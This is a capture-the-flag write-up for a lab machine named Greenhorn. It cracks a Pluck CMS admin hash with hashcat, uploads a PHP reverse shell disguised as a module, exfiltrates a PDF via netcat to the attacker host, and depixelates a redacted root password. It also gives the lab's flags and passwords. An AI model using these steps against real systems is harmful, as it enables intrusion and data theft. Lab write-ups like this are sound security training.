# Tasks

[**1. How many TCP ports are listening on Greenhorn?**](#task-1)

[**2. What content management system (CMS) and version powers the website on TCP 80?**](#task-2)

[**3. Where does pluck save its admin hash? Give the answer relative to the root of the Pluck instance.**](#task-3)

[**4. What is the admin password for this Pluck instance?**](#task-4)

[**5. What system user on Greenhorn is the Pluck instance running as?**](#task-5)

[**6. What is the junior user's password on Greenhorn?**](#task-6)

[**7. User Flag**](#task-7)

[**8. Besides the user flag, what is the name of the other document in the junior user's home directory?**](#task-8)

[**9. What is the root user's password?**](#task-9)

[**10. Root Flag**](#root-flag)

# Tools Used

- nmap
- hashcat
- depix

# Skills Used

- Hash Cracking via Hashcat
- Using PoC from CVE to exploit
- File Exfiltration
- Depixelating redacted information

# Solution

## Task 1

![image](https://github.com/user-attachments/assets/5cac9dd9-5814-4140-8a04-680143782d8e)

**Answer: 3**

## Task 2

![image](https://github.com/user-attachments/assets/ce733eb5-7562-4c30-bd91-80c0b8f1fde3)

Well we know it's _Pluck_, but we still have to find the version, so let's scout around real quick.

![image](https://github.com/user-attachments/assets/cc81e9a8-815e-4cb3-9c62-dc246f7f3de8)

Apparently clicking on _admin_ at the bottom of the page not only showed us the version number, but also a login page. Could come in handy later, but for now...

**Answer: pluck 4.7.18**

## Task 3

So for this one, we know _port 3000_ is also open, so let's go over there.

![image](https://github.com/user-attachments/assets/74a0ed8f-eff8-49cb-b816-babb2d7df704)

![image](https://github.com/user-attachments/assets/57f91d84-970d-4ef9-9ae7-617b615359f3)

Now since it's apparently the website's _Git Repo_, time to find the answer here.

![image](https://github.com/user-attachments/assets/ac684c2e-39ac-406e-9a21-e9e0de275f3b)

Should prolly look into this more to better understand how it works, but anyways.

**Answer: data/settings/pass.php**

## Task 4

Alright, let's use the info we found earlier to find this password.

![image](https://github.com/user-attachments/assets/005aa719-9de9-49ee-b83b-4c2cea81ac38)

So apparently we just have a hash here lol, but since it's _SHA-512_, it's very easily crackable. Because it's very easily crackable, I'm gonna practice using _hashcat_.

**Command:**

```
hashcat -m 1700 -a 0 admin.txt /usr/share/wordlists/rockyou.txt

Where:
-m [value] = hash type
-a 0 = attack type; specified to dictionary using rockyou
```

**Result:**

![image](https://github.com/user-attachments/assets/3afefe3d-8fc9-4a7d-b72a-7f309ce5f0dd)

There we go.

**Answer: iloveyou1**

## Task 5

Alright, now let's log into _admin_.

![image](https://github.com/user-attachments/assets/c293c618-a5a1-410e-9ed1-bacb806ec65f)

Now let's mess around.

![image](https://github.com/user-attachments/assets/69fda404-197c-436f-9823-8284ee8ab376)

![image](https://github.com/user-attachments/assets/2d48d9bc-b358-4a40-8d92-0713ab7da067)

So I found these two file uploaders, you know what that means >:)

Let's go for the easier option though, pretty sure the second file upload found accepts _PHP_ so.

**Edit:** So I looked at another writeup to see if I was doing something wrong, since neither file uploader really worked, and apparently I was supposed to search for a _CVE_ related to the _Pluck version_ that I found,
which would've instructed me to look for the page where I can install new modules, so that's what I did here.

![image](https://github.com/user-attachments/assets/7777e678-b1be-4a6c-b074-44663bd190f3)

It only accepts _zip_ files btw, so do this:

```
zip shell.zip shell.php
```

Anyways, now we got the rev shell.

![image](https://github.com/user-attachments/assets/e62e6288-601b-4d84-90b5-a97bba78b229)

**Answer: www-data**

## Task 6

So apparently this question became relevant cuz of this:

![image](https://github.com/user-attachments/assets/7b8e8f93-ec3b-4f93-997e-76fb650d659c)

I need that password lol. But, I found that the password a while ago was reused :/

**Answer: iloveyou1**

## User Flag

![image](https://github.com/user-attachments/assets/6782c46a-5200-4f22-8244-1d3542e91cd5)

**Answer: c0d1f5db851eab751d1e1f3a073d9ddf**

## Task 8

![image](https://github.com/user-attachments/assets/aecb03ef-f0e0-47d3-a473-1172f909af0f)

Yes.

**Answer: Using OpenVAS.pdf**

## Task 9

Ok so for this one, let's exfil that pdf and see what's in it.

**Commands:**

```
On Host:

nc -lvnp 4444 > OpenVAS.pdf

On Victim:

nc -vn [IP] 4444 < 'Using OpenVAS.pdf'
```

**Results:**

![image](https://github.com/user-attachments/assets/dcfdd575-5587-4fc1-9e7f-b6dd2c9af629)

Anyways, now that we got that, let's read it.

![image](https://github.com/user-attachments/assets/719ddbf7-dabc-4481-950a-e4a8508ce690)

Welp, looks like the password's here, but it's pixelated. Let's see what we can do about that.

[**Take a look at this**](https://thehackernews.com/2022/02/this-new-tool-can-retrieve-pixelated.html)

Let's see if we can use that for our needs.

So the blog lists two open-source depixelating algorithms. I check _Unredacter_ first, but seems like it's a bit complicated to use. _Depix_ on the other hand seems fine to use, so let's go with that.

Don't forget to ```git clone``` the _Depix_ repo so we can use it.

![image](https://github.com/user-attachments/assets/198446a5-65a2-40d0-8f3e-dcba732922cb)

![image](https://github.com/user-attachments/assets/076782ec-ab40-48b9-b46e-9547478a2b19)

Ok so the first time around it didn't work. At this point, I was really sleep and couldn't really think about what went wrong, so I went to check another writeup to see if someone else had the same issue. It turns out,
the image must be so precise that there only the pixelated text is in view. I thought that'd be really hard, but apparently the writeup said that in the pdf viewer, you can right-click the image and it'll give the option
of saving it, so I went and did that too.

Let's see if it works this time.

![image](https://github.com/user-attachments/assets/a0a5e2a7-82ef-4416-ad00-a5f2397b9102)

![image](https://github.com/user-attachments/assets/435698f8-ff7e-4abb-b300-61482d2778bd)

I finally got it.

**Answer: sidefromsidetheothersidesidefromsidetheotherside**

## Root Flag

Ok, just use that password now and we good to go.

![image](https://github.com/user-attachments/assets/875e692e-66b7-472a-af90-6bafa125ec0a)

**Answer: 3dee4329b121cce3fc869583be87e596**
